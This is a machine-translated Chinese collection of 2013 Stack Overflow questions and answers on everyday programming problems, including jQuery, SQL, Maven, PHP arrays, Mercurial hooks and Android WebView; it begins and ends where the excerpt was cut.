[如何在 ViewModel 中以编程方式切换选项卡？](https://stackoverflow.com/q/7305476)

但我想做的只是出于对用户的礼貌而切换选项卡，而不是使其具有约束力。（当用户开始“扫描”时，我想切换到“监控”选项卡，但不会因为扫描仍在运行而阻止他更改选项卡）。

我已经确定该设置`mode=OneWay`将避免用户通过更改选项卡*来停止*扫描，但我最初绑定到“扫描”的想法并不好，因为当它设置为“假”时，选项卡会变为“未选中” ' 我只得到一个空白矩形。当它从假变为真时，我*只能调用“属性已更改”，但这似乎是非常错误的。*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T08:30:30.580

我最终决定后面的代码是最好的方法。这对用户来说是一种 UI 便利，而 ViewModel 不需要知道任何关于它的信息。所以我钩入“开始”按钮并在单击时切换选项卡。

# ios - iOS：引用核心图标前：搜索放大镜？

> ID：15899423
> 
> 赞同：0
> 
> 时间：2013-04-09T10:24:31.137
> 
> 标签：ios, icons

是否可以引用 iOS 核心图标？例如，我想放置一个带有搜索放大镜的图像视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:33:30.860

您不能直接引用它们，但您可以从模拟器中提取图形并在您的应用程序中使用它们。请参阅github 上的[UIKit Artwork Extractor 。](https://github.com/0xced/UIKit-Artwork-Extractor)在视网膜和非视网膜模拟器中运行应用程序并转储所有 iOS 图形文件。

# javascript - 使用 if esle 执行 slideDown

> ID：15899425
> 
> 赞同：0
> 
> 时间：2013-04-09T10:24:35.760
> 
> 标签：javascript, forms, slidedown

我有一个由两部分组成的表格，都在同一页面上。

我希望一个`<p>`元素成为表单的第二部分。`<p>`需要是不可见的，并且仅在填写表格的第一部分时才显示。因此，当您填写表格并单击下一步时，向下`<p>`滑动并显示表格的其余部分

```
$(document).ready(function(){
  $(".btn1").click(function(){
    $("p").slideUp();
  });
  $(".btn2").click(function(){
    $("p").slideDown();
  });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:37:34.790

根据您提供的信息，我认为您正在寻找这个：-

HTML:-

```
<input type="button" id="btn1" value="Prev">
<input type="button" id="btn2" value="Next">
<div>welcome to mypage
    fill all the fields :- Form 1</div>
<p style="display:none">
    Now Fill this section :- Form 2
</p> 
```

JS：-

```
$(document).ready(function(){
  $("#btn1").click(function(){
    $("p").slideUp();
  });
  $("#btn2").click(function(){
    $("p").slideDown();
  });
}); 
```

[查看演示](http://jsfiddle.net/Zy5xc/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:40:10.417

将这两个部分放在两个带有 id 的 div 中，并为第二个 div 设置样式显示 none。

```
style="display:none" 
```

然后使用它。

```
$(document).ready(function(){
  $(".btn1").click(function(){
    $("div2").show();
    $("div1").hide().slideUp();
  });
  $(".btn2").click(function(){
    $("div1").show();
    $("div2").hide().slideDown();
  });
}); 
```

# c# - 如何在一个标签中一个接一个地显示2个不同的文本？

> ID：15899427
> 
> 赞同：-2
> 
> 时间：2013-04-09T10:24:46.863
> 
> 标签：c#, asp.net, .net

如何同时使用计时器在一个标签中显示两个不同的文本。例如，我想在 10 秒后显示第一个国内，它应该在单个标签中更改为国际。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:30:11.657

HTML

```
<label id="myLabel">Domestic</label> 
```

JS：

```
var changeLabel = function(){
  document.getElementById('myLabel').innerHTML = 'International';
}
window.setTimeout(changeLabel, 10000); 
```

[演示](http://fiddle.jshell.net/Pisi2012/dyJBj/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T14:16:43.023

```
var changeLabel = function(){

  var text = document.getElementById('myLabel').innerHTML;
  if(text == 'Domestic')
      document.getElementById('myLabel').innerHTML = 'International';
  else
      document.getElementById('myLabel').innerHTML = 'Domestic';

  window.setTimeout(changeLabel, 10000);
} 
```

您可以在 body html 标记中使用它：`<body OnLoad="changeLabel()">`

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-09T10:30:41.057

您可以使用 setTimeout() 在 10 秒后显示第二个文本。

# math - 如何计算 3D 线段的法线

> ID：15899432
> 
> 赞同：1
> 
> 时间：2013-04-09T10:24:58.497
> 
> 标签：math, opengl, normalization, opengl-3, normals

我从 Blender（一种发型）中导出了一些头发颗粒。这些由几行（GL_LINES）组成。我的 openGL 程序可以毫无问题地显示这些粒子。现在我只想在这些粒子上应用光属性。Blender 不会导出法线向量，所以我需要自己计算它们。我知道以下规则：

如果我们将线段定义为二维的 [AB]，我们有 dx = xB - xA 和 dy = yB - yA，那么法线是 N1(-dy, dx) 和 N2(dy, -dx)。

我希望我没有犯任何错误。

但是如果我在我的线段坐标中添加 z 维度（例如 A(5,2,3) 和 B(0,0,-5)），我不知道 3D 空间线段定义的规则。

有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T12:48:05.823

如果您假设您可以从两个向量开始，并且看起来就像您所说的那样，请将它们称为 v，w，以获得法向量取叉积。根据具体情况，首先对 v、w 进行归一化并不是一个坏主意。叉积可由下式给出：

```
v x w =(v_2w_3 - v_3w_2, v_3x_1 - v_1w_3, v_1w_2 - v_3w_1), 
```

这里 v_i 是 v 的第 i 个分量，依此类推。相邻的数字代表乘法。当然，你有正负这个向量给出两种可能性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T11:19:28.927

由于 Aki 忘记了评论不是答案：

3D 空间中的线没有法线。从技术上讲，*二维*空间中的线也没有法线。他们有*两个*法线。

垂直于 3D 空间中一条线的方向有无数个。所有这些法线都在同一平面上，但方向不同。如果没有一些更高级的算法（可能基于相邻线），就无法选择其中一个法线而不是另一个法线。

# sql - 将一个表中的值插入到另一个表中

> ID：15899433
> 
> 赞同：1
> 
> 时间：2013-04-09T10:25:00.357
> 
> 标签：sql, sql-server-2008

我有以下 SQL。我正在尝试将`ClientName`from`Clients`插入`pName`. `CommisionPickups`我需要确保所有值都是唯一的。

```
insert into CommisionPickups (pName) 
   (select ClientName 
    from Clients  
    where ClientName <> CommisionPickups.pName) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:29:17.770

您不能用于`<>`检查唯一性。为确保所有名称都是唯一的，您需要确保从 中选择唯一名称`CommisionPickups`，并且您插入的名称不存在于 中`Clients`。使用`NOT EXISTS`for`CommisionPickups`和`DISTINCT`for `Clients`，如下所示：

```
insert into CommisionPickups (pName) 
(select DISTINCT c.ClientName from Clients c
where NOT EXISTS (SELECT 1 FROM CommisionPickups cp
                  WHERE c.ClientName = cp.pName)
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:34:25.597

我无法得到你的问题，但我部分理解可能是你要求这个

如果您想在 pname 中插入较远的值而不是使 pname 唯一，它将自动工作并选择

```
select  DISTINCT ClientName from Clients 
```

看看这个你能得到

[http://www.w3schools.com/sql/sql_select_into.asp](http://www.w3schools.com/sql/sql_select_into.asp)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T11:05:44.930

这是实现它的一种方法。我在 SQL Server 中工作，但我希望它适用于任何数据库引擎

```
 INSERT  INTO CommisionPickups ( pName )
    SELECT DISTINCT
            ClientName
    FROM    Client
    WHERE   ClientName NOT IN ( SELECT DISTINCT
                                        pName
                                FROM    CommisionPickups ) 
```

# nservicebus - VS2012是否有“NServiceBus System”项目模板

> ID：15899437
> 
> 赞同：1
> 
> 时间：2013-04-09T10:25:20.530
> 
> 标签：nservicebus

是否有 Visual Studio 2012 NServiceBus 系统项目模板？我可以看到安装工具文件夹中有一个 VS2010：`/NServiceBus/v3.3.5/Tools/NServiceBusStudio.vsix`

我在 NuGet 上搜索，但找不到任何东西。VS2012 模板的开发是否在进行中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:49:46.653

NServiceBus Studio for Visual Studio 2012 的开发已进入最后阶段。公开测试版将在不久的将来发布。

# spring - 在 spring-hibernate-maven 项目中出错

> ID：15899438
> 
> 赞同：5
> 
> 时间：2013-04-09T10:25:21.217
> 
> 标签：spring, hibernate, maven, annotations

尝试运行项目时出现“找不到类文件 functionContext”错误。它运行没有错误，但是在我编写了一些单元测试并删除它们之后它开始给出这个错误。这是错误堆栈跟踪；

## 编译错误：

```
Failure executing javac, but could not parse the error:

An annotation processor threw an uncaught exception.
Consult the following stack trace for details.
java.lang.RuntimeException: com.sun.tools.javac.code.Symbol$CompletionFailure: class file for org.jaxen.FunctionContext not found
    at org.eclipse.persistence.internal.jpa.modelgen.CanonicalModelProcessor.process(CanonicalModelProcessor.java:407)
    at com.sun.tools.javac.processing.JavacProcessingEnvironment.callProcessor(JavacProcessingEnvironment.java:793)
    at com.sun.tools.javac.processing.JavacProcessingEnvironment.discoverAndRunProcs(JavacProcessingEnvironment.java:722)
    at com.sun.tools.javac.processing.JavacProcessingEnvironment.access$1700(JavacProcessingEnvironment.java:97)
    at com.sun.tools.javac.processing.JavacProcessingEnvironment$Round.run(JavacProcessingEnvironment.java:1029)
    at com.sun.tools.javac.processing.JavacProcessingEnvironment.doProcessing(JavacProcessingEnvironment.java:1163)
    at com.sun.tools.javac.main.JavaCompiler.processAnnotations(JavaCompiler.java:1108)
    at com.sun.tools.javac.main.JavaCompiler.compile(JavaCompiler.java:824)
    at com.sun.tools.javac.main.Main.compile(Main.java:439)
    at com.sun.tools.javac.main.Main.compile(Main.java:353)
    at com.sun.tools.javac.main.Main.compile(Main.java:342)
    at com.sun.tools.javac.main.Main.compile(Main.java:333)
    at com.sun.tools.javac.Main.compile(Main.java:94)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.plexus.compiler.javac.JavacCompiler.compileInProcess(JavacCompiler.java:554)
    at org.codehaus.plexus.compiler.javac.JavacCompiler.compile(JavacCompiler.java:161)
    at org.apache.maven.plugin.AbstractCompilerMojo.execute(AbstractCompilerMojo.java:605)
    at org.apache.maven.plugin.CompilerMojo.execute(CompilerMojo.java:128)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
    at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
    at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
    at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
    at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
    at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
Caused by: com.sun.tools.javac.code.Symbol$CompletionFailure: class file for org.jaxen.FunctionContext not found 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-12-10T09:28:32.567

将[jaxen](http://mvnrepository.com/artifact/jaxen/jaxen)添加到您的库中可以解决此问题。

如果您在项目属性中禁用注释处理，它也会开始工作，但是您不能使用像[lombok](http://projectlombok.org/)这样的东西（lombok 会即时生成 getter/setters/hashcode/constructors）。

编辑：Jaxen 托管在 codehouse，但 codehouse 已停产并且 jaxen.org 已过时。上面的链接指向 maven 存储库，我不确定是否有更好的。

[![启用注释处理](https://i.stack.imgur.com/SNBZl.png)](https://i.stack.imgur.com/SNBZl.png)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-24T03:47:43.643

你用的是Netbeans吗？

如果是这样，请进入项目的构建设置并取消选中“启用注释处理”。

问候

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-01-07T17:41:35.050

你需要这个依赖：

```
<!-- https://mvnrepository.com/artifact/jaxen/jaxen -->
<dependency>
    <groupId>jaxen</groupId>
    <artifactId>jaxen</artifactId>
    <version>1.1.1</version>
</dependency> 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-07-27T05:09:08.850

似乎不知何故，依赖项没有从网络加载。所以我选择了'Build with dependencies'并且构建成功了......

Rgds, 苏普

# google-drive-api - 如何将word文档替换为驱动器中的演示文稿

> ID：15899446
> 
> 赞同：1
> 
> 时间：2013-04-09T10:25:47.140
> 
> 标签：google-drive-api

我能够将文件从我的系统同步到 Google 驱动器，反之亦然。我想知道是否有任何方法可以使用 Google-api-php-client 更改文件 mime 类型和内容。简而言之，我已经上传了一个 word 文档到驱动器，现在我想用演示文稿替换这个文件。

当我尝试这个时，我得到了 500 个内部错误。我可以捕获此异常，然后可以创建一个新文件而不是更新文件，但可能是由于任何其他原因我收到此异常，然后它会导致驱动器中的文件重复。

是否允许此操作，这在 Google 驱动器中是否可行？？？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T12:17:41.147

Following snippet works fine and converts a plain text file into a png one. Existing file had a `text/plain` mime-type. If the mime-type you want to convert to is unknown, that may be a problem.

```
$mimeType = 'image/png';
$file = $service->files->get($fileId);
$file->setMimeType($mimeType);

// Update the existing file.
$output = $service->files->update(
  $fileId, $file, array('data' => '...', 'mimeType' => $mimeType)
); 
```

# php - PHP数组按日期合并

> ID：15899447
> 
> 赞同：4
> 
> 时间：2013-04-09T10:25:57.437
> 
> 标签：php, arrays

我有 2 个数组，每个数组有 2 个属性

**第一个数组：**

大批 （

```
[0] => Array
    (
        [uregisterDate] => 2013-04-03
        [total] => 4
    )

[1] => Array
    (
        [uregisterDate] => 2013-04-04
        [total] => 4
    )

[2] =>; Array
    (
        [uregisterDate] => 2013-04-05
        [total] => 3
    ) 
```

)

**第二个数组：**

大批 （

```
[0] => Array
    (
        [uregisterDate] => 2013-04-03
        [totalFailed] => 2
    )

[1] => Array
    (
        [uregisterDate] => 2013-04-04
        [totalFailed] => 4
    ) 
```

)

我希望最终数组像下面的输出 |( 在两个数组之间合并，键为 uregistredDate：

大批 （

```
[0] => Array
    (
        [uregisterDate] => 2013-04-03
        [total] => 4
        [totalFailed] => 2
    )

[1] => Array
    (
        [uregisterDate] => 2013-04-04
        [total] => 4
    [totalFailed] => 4
    )

[2] =>; Array
    (
        [uregisterDate] => 2013-04-05
        [total] => 3
    ) 
```

)

任何想法，代码片段？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:48:54.603

试试这个代码。

```
function combo($array1, $array2) {
    foreach($array1 as $key => $value) {
        if(isset($array2[$key]))
        $result[$key] = array_merge($value, $array2[$key]);
        else
        $result[$key] = $value;
    }
    return $result;
}
$array = combo(#your array 1#, #your array 2#);
print_r($array); // to view the output 
```

更新代码

```
function combo($array1, $array2) {
    foreach($array1 as $key => $value) {
        if(isset($array2[$key])) {
        if($value['uregisterDate'] == $array2[$key]['uregisterDate'])
           {
            $result[$key] = array_merge($value, $array2[$key]);
            } 
            else
            {
                $result[$key] = $array2[$key];
                $result[rand(0,99)]= $value;
            }

        }
        else
        $result[$key] = $value;
    }
    return array_values($result);
}
$array = combo($a1, $a2);
print_r($array); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T11:00:22.127

试试这个功能

```
$array1 = array(
    array( "uregisterDate" => '2013-04-03', "total" => 4 ),
    array( "uregisterDate" => '2013-04-04', "total" => 4 ),
    array( "uregisterDate" => '2013-04-05', "total" => 3 )
   );

$array2 = array(
    array( "uregisterDate" => '2013-04-03', "totalFailed" => 2),
    array( "uregisterDate" => '2013-04-04', "totalFailed" => 3 )
   );

function merge_array_common_key($a1, $a2, $Ckey) {
    $merge = array_merge($a1,$a2);
    $keys = array();
    foreach ($merge as $key => $value) {
        if(isset($keys[$value[$Ckey]])){
            $merge[$keys[$value[$Ckey]]] += $value;
            unset($merge[$key]);
            continue;
        }
        $keys[$value[$Ckey]] = $key;
    }
    return $merge;
}

$test = merge_array_common_key($array1, $array2, 'uregisterDate');

var_dump($test); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T11:00:26.493

尝试类似：

```
function combine( $key, $array1, $array2 )
{
    $args = func_get_args();
    array_shift( $args );
    $return = $args[0];
    $arrays = array_slice( $args, 1 );

    foreach ( $arrays as $array ) {
        foreach ( $array as $arrayValue ) {
            $match_found = false;
            foreach ( $return as $i => $value ) {
                if ( isset( $value[$key] ) && isset( $arrayValue[$key] ) && $value[$key] == $arrayValue[$key] ) {
                    $return[$i] = array_merge( $value, $arrayValue );
                    $match_found = true;
                }
            }

            if ( !$match_found ) {
                $return[] = $arrayValue;
            }
        }
    }

    return $return;
}

$array = combine( "uregisterDate", $array1, $array2 ); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-09T10:37:29.793

我认为内置函数 array_merge_recursive() 将是 gr8：

```
$array = array_merge_recursive($array1, $array2); 
```

或功能可能有帮助

```
$newarray = Array();
foreach ($arr1 as $element=>$value){
    $newarray = array_merge($arr1[$element],$arr2[$element])
} 
```

# mercurial - Mercurial Automatic Push on Client Push 在 2 个服务器之间

> ID：15899448
> 
> 赞同：1
> 
> 时间：2013-04-09T10:25:59.297
> 
> 标签：mercurial, bitbucket

我想知道当我从本地电脑推送到本地中央存储库时，如何自动推送到 bitbucket。让我解释：

这是一个 2 服务器（bitbucket，本地中央存储库（ubuntu 服务器））和一个客户端设置。

项目 A 托管在 bitbucket 上。本地中央存储库具有项目 A 的可推送克隆。客户端具有 ubuntu 中央存储库的可推送克隆。

期望的效果应该是：

1.  客户端在本地提交，并在某些时候推送（多次提交）到中央存储库。
2.  然后，ubuntu 中央存储库应自动推送到 bitbucket。

第2步怎么做？

问候，

S. Mantziaris

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:43:15.590

你可以用一个钩子来做到这一点：

在您的 Ubuntu 存储库中，编辑该`.hg/hgrc`文件以包含以下内容：

```
[hooks]
changegroup = hg push default 
```

这个钩子将在推送到 Ubuntu 服务器完成后执行（或者从客户端拉到 Ubuntu，如果你这样做的话），它将把更改推送到默认推送目标。如果 BitBucket 不是您的默认推送目标，那么您可以相应地更改推送命令。

# android - 如何侦听连接到我的 AP 的事件？

> ID：15899449
> 
> 赞同：0
> 
> 时间：2013-04-09T10:26:04.080
> 
> 标签：android, android-wifi, wifi-direct

我用我的手机（手机A）创建了一个WI-FI AP，然后成功启用它；然后我用另一部手机（手机B）连接到AP；

现在我想知道如何获取连接到电话 A 创建的 AP 的设备的信息；

最好我可以监听连接到 AP 的事件。

谁能帮我 ？或者有什么建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:31:01.210

似乎没有开放的 API 可以这样做。这是一种解决方法，请注意文件：/proc/net/arp 您可以使用以下命令进行测试：`adb shell cat /proc/net/arp` 要获得如下结果：

```
IP address       HW type     Flags       HW address            Mask     Device
192.168.43.83    0x1         0x2         80:c6:ab:4b:e9:4d     *        wlan0 
```

这是连接到便携式 AP 的 DHCP 客户端列表。

# javascript - 如何将两个 div 放置在页面的绝对前面，但一个在另一个之上？CSS

> ID：15899451
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:26:06.957
> 
> 标签：javascript, css

我正在创建一个自定义覆盖弹出窗口。为此，我使用at和at`div`在页面上放置一个遮罩。弹出窗口是另一个位于 masking 顶部的窗口。`width/height``100%``opacity``0.8``div``div`

如果单击`div`掩码，我正在编写一个函数来隐藏这两个s。`div`这将“关闭”弹出窗口。

为了测试这个功能，我使用了 Javascript 警报。我注意到单击弹出窗口时仍会触发警报`div`，而不仅仅是屏蔽`div`。这表明弹出窗口`div`没有定位到绝对前面。我还注意到弹出窗口`div`中的文本略微不透明，表明它也受到 masking 的影响`div`。

***如何将遮罩 div 定位到绝对前面？***

**[小提琴](http://jsfiddle.net/sGeVT/1/)**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:33:27.983

[http://jsfiddle.net/c26Ez/](http://jsfiddle.net/c26Ez/)

用于`stopPropagation()`使事件不会冒泡 dom

# php - 平均评分值计数

> ID：15899452
> 
> 赞同：4
> 
> 时间：2013-04-09T10:26:09.167
> 
> 标签：php, mysql, database, cron, rating

我正在开发一个拥有 10 星评级系统的网站。所有评级都存储在 tbl_rating 中并具有以下属性：

```
id
heading
description
rating (number of stars, 1 to 10)
shop_id (each rating belongs to a shop - my site is a catalog of shops) 
```

我的问题是，计算商店平均评分的最佳方法是什么（基本上我只需要将所有评分与特定 shop_id 相加，然后除以这些评分的数量）。每个商店也有列 avg_rating，我可以在其中存储值。

有没有办法告诉 MySql 数据库每小时统计一次这个统计数据？我应该在每个新提交的评分之后甚至每次查询商店属性 avg_rating 时都计算它吗？有什么方法可以告诉数据库自动执行此操作，还是我必须从 PHP 运行这些操作？我正在使用 PHP、Yii 框架和 MySQL 数据库。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:37:00.923

你需要一个[cron 工作](http://en.wikipedia.org/wiki/Cron)（不确定 Yii 是否有使这更容易的功能）。

**PHP**

基本上，您需要编写一个 PHP 脚本来重新计算投票，并将它们放在一个单独的表中，并且您需要该脚本每小时运行一次，或者您希望它多久运行一次。

cron 命令类似于：

```
php updateRatings.php 
```

**MySQL**

您可以使用类似于下一个命令的命令作为 cron。

```
mysql -h HOST -u USER -pPASS -e "UPDATE ..." 
```

对于实际的 SQL 查询 - 你应该检查这个问题：[MySQL - UPDATE query based on SELECT Query](https://stackoverflow.com/questions/1262786/mysql-update-query-based-on-select-query)

**更新：**

您可以使用与此类似的查询：

```
UPDATE
    tbl_averages ta
SET 
    rating =
    (SELECT 
        AVG(tr.rating)
    FROM 
        tbl_rating tr
    WHERE 
        ta.shop_id = tr.shop_id) 
```

表 tbl_averages 包含 cols`shop_id`和`rating`.

# android - Android webview 适合所有内容到屏幕上

> ID：15899453
> 
> 赞同：9
> 
> 时间：2013-04-09T10:26:12.563
> 
> 标签：android, android-webview, android-windowmanager

嗨，我有一个 webview，我希望它适合屏幕，这样用户就不必水平或垂直滚动

我之前搜索过，很多人建议以下但它只限制宽度，用户仍然需要垂直滚动：

```
engine = (WebView) (findViewById(R.id.webView1));
engine.loadUrl(www.example.com); 
engine.getSettings().setLoadWithOverviewMode(true);
engine.getSettings().setUseWideViewPort(true); 
```

我尝试了另一种方法，使用缩放方法，但它不起作用.....我得到了窗口宽度（1024 像素），网页内容宽度也是 1024 像素！！所以缩放不起作用....有没有什么方法可以得到正确的比例？

或者....还有其他方法吗？....谢谢！！

```
// get the window width and height
    Point outSize = new Point();
    getWindowManager().getDefaultDisplay().getSize(outSize);
    width = outSize.x;
    height = outSize.y;
    Log.i("Menuboard", "width: " + Integer.toString(width) + ", height: "
            + Integer.toString(height));

WebViewClient client = new WebViewClient() {

        public void onPageFinished(WebView view, String url) {
            int x = engine.getWidth();
            int y = engine.getHeight();

            Log.i("Menuboard", "web width: " + Integer.toString(x)
                    + ", height: " + Integer.toString(y));

            int scale1 = width * 100/x;
            int scale2 = height * 100/y;

            Log.i("Menuboard", "Scale1: " + Integer.toString(scale1)
                    + ", Scale2: " + Integer.toString(scale2));

            if (scale1 < scale2) {
                engine.setInitialScale(scale1);
                Log.i("Menuboard", "scale1");
            } else if (scale1 > scale2) {
                engine.setInitialScale(scale2);
                Log.i("Menuboard", "scale2: " + Integer.toString(scale2));
            }
        }
    };

    engine = (WebView) (findViewById(R.id.webView1));
    engine.loadUrl(string);
    engine.getSettings().setBuiltInZoomControls(true);
    engine.setPadding(0, 0, 0, 0);
            engine.setWebViewClient(client); 
```

只是一些注释：

要缩放 web 视图：

```
engine = (WebView) (findViewById(R.id.webView1));
engine.loadUrl(www.example.com);
engine.getSettings().setBuiltInZoomControls(true);
engine.setPadding(0, 0, 0, 0);
engine.setInitialScale(50); // 0 - 100 where 100 is full scale 
```

获取窗口宽度和高度：

```
Point outSize = new Point();
getWindowManager().getDefaultDisplay().getSize(outSize);
width = outSize.x;
height = outSize.y; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-06-05T08:51:13.577

使用以下方法。

```
webview.getSettings().setUseWideViewPort(true);
webview.getSettings().setLoadWithOverviewMode(true); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-03T05:49:23.417

要使 webview 扩展到整个屏幕，请在活动布局 xml 中添加 webview，并确保将`layout_width`and设置`layout_height`为`fill_parent`. 这是一个简单的例子：

```
 <LinearLayout 
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:orientation="vertical"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent">
  <WebView  
      android:id="@+id/webview"
      android:layout_width="fill_parent" 
      android:layout_height="fill_parent"/>
  </LinearLayout> 
```

# php - PHP REGEX - 删除多余的换行符 - 字符串操作问题

> ID：15899460
> 
> 赞同：1
> 
> 时间：2013-04-09T10:26:41.583
> 
> 标签：php, regex, string, preg-replace, line-breaks

我正在输入一个脏字符串（在标点符号之前有很多空格、换行符和额外的假空格。

我想要的输出在下面的代码中进行了解释。

似乎我可以删除多余的空格 + 删除标点符号之前的空格。**但是我的输出仍然有多余的换行符。**

我在将用户输入从 MySQL db 打印到屏幕时使用下面的函数。

```
echo "\t\t".'<p>'.nl2br(convert_str(htmlspecialchars($comment))).'</p>'."\r\n"; 
```

我的自定义功能代码如下：

```
function convert_str ($str)
{
    // remove excess whitespace
    // looks for a one or more spaces and replaces them all with a single space.
    $str = preg_replace('/ +/', ' ', $str);
    // check for instances of more than two line breaks in a row
    // and then change them to a total of two line breaks
    //did not worked for me --> preg_replace('/(?:(?:\r\n|\r|\n)\s*){2}/s', "\n\n", $str);
    $str = preg_replace('/[ \t]+/', ' ', preg_replace('/\s*$^\s*/m', "\n", $str));
    // if exists; remove 1 space character just before punctuations below:
    // $punc = array('.',',',';',':','...','?','!','-','—','/','\\','“','”','‘','’','"','\'','(',')','[',']','’','{','}','*','&','#','^','<','>','|');
    $punc = array(' .',' ,',' ;',' :',' ...',' ?',' !',' -',' —',' /',' \\',' “',' ”',' ‘',' ’',' "',' \'',' (',' )',' [',' ]',' ’',' {',' }',' *',' &',' #',' ^',' <',' >',' |');
    $replace = array('.',',',';',':','...','?','!','-','—','/','\\','“','”','‘','’','"','\'','(',')','[',']','’','{','}','*','&','#','^','<','>','|');
    $str = str_replace($punc,$replace,$str);
    return $str;
} 
```

你能纠正我吗？

更新：我使用准备好的语句将用户输入输入到 MySQL 数据库表中，并且在进入数据库期间我不操作用户的数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T15:46:20.297

我发现了一个简单但耗时 5 小时的原因：使用 just`\n`而不是`\r\n`.

所以满足我要求的代码是：

```
function convert_str ($str)
{
    // remove excess whitespace
    // looks for a one or more spaces and replaces them all with a single space.
    $str = preg_replace('/ +/', ' ', $str);
    // check for instances of more than two line breaks in a row
    // and then change them to a total of two line breaks
    $str = preg_replace('/(?:(?:\r\n|\r|\n)\s*){2}/s', "\r\n\r\n", $str);
    // if exists; remove 1 space character just before punctuations below:
    // $punc = array('.',',',';',':','...','?','!','-','—','/','\\','“','”','‘','’','"','\'','(',')','[',']','’','{','}','*','&','#','^','<','>','|');
    $punc = array(' .',' ,',' ;',' :',' ...',' ?',' !',' -',' —',' /',' \\',' “',' ”',' ‘',' ’',' "',' \'',' (',' )',' [',' ]',' ’',' {',' }',' *',' &',' #',' ^',' <',' >',' |');
    $replace = array('.',',',';',':','...','?','!','-','—','/','\\','“','”','‘','’','"','\'','(',')','[',']','’','{','}','*','&','#','^','<','>','|');
    $str = str_replace($punc,$replace,$str);
    return $str;
} 
```

# php - 如何在javascript中检查当前时间是五分钟的倍数？

> ID：15899461
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:27:00.803
> 
> 标签：php, javascript, datetime

我想知道当前时间是否是五的倍数。这意味着，我想检查它是否是 8:30、8:35、8:40，.... javascript 或 php 中是否有任何函数可以做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:29:00.090

```
function isFivesMultiple(){
    return new Date().getMinutes() % 5 == 0
} 
```

19:00 呢？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-09T10:28:45.683

在 php 中是：

```
if(date('i')%5==0){
    echo "the current date is a multiple of 5";
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-09T10:28:46.483

在 javascript 中，获取当前分钟 ( ) 并使用模 ( ) 运算符`Date.getMinutes()`检查它是 5 的倍数；`%`

```
var date = new Date(2013,3,9,8,30)
alert(date.getMinutes() % 5 == 0); // alerts "true"

var date2 = new Date(2013,3,9,8,32)
